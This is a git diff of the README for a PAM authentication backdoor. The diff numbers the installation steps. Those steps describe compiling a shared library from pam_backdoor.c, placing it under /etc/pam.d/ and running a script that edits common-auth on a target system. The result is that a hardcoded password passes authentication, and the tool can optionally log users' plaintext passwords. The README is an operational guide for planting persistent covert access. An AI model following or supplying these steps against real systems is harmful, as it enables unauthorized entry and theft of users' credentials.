@@ -10,14 +10,14 @@ If you'd like to also log all plaintext passwords used by users (similar to Mimi
 
 ## Installation
 
-Compile the C code like so:
+1) Compile the C code like so:
+
 `gcc -fPIC -shared -o pam_login.so pam_backdoor.c`
 
-Transfer the binary to `/etc/pam.d/`
+2) Transfer the binary to `/etc/pam.d/`
 
-Modify PAM's `common-auth` file by running `modify_common_auth.sh` on the target system. Feel free to modify this script if you don't want to upload the binary to `/etc/pam.d/` and instead want to use the default directory for PAM (for example, `/lib/x86_64-linux-gnu/security/` on Ubuntu)--you won't need to specify an absolute path after `auth sufficient` in this case. 
+3) Modify PAM's `common-auth` file by running `modify_common_auth.sh` on the target system. Feel free to modify this script if you don't want to upload the binary to `/etc/pam.d/` and instead want to use the default directory for PAM (for example, `/lib/x86_64-linux-gnu/security/` on Ubuntu)--you won't need to specify an absolute path after `auth sufficient` in this case. 
 
 ## Information
 
 Naturally, this doesn't actually patch or recompile anything from PAM. It simply specifies another authentication route for PAM to take before taking the normal user authentication route. If the user's password equals the specified password in the binary, we return `PAM_SUCCESS` early, bypassing the actual auth check. If not, we default to the original auth check.
-
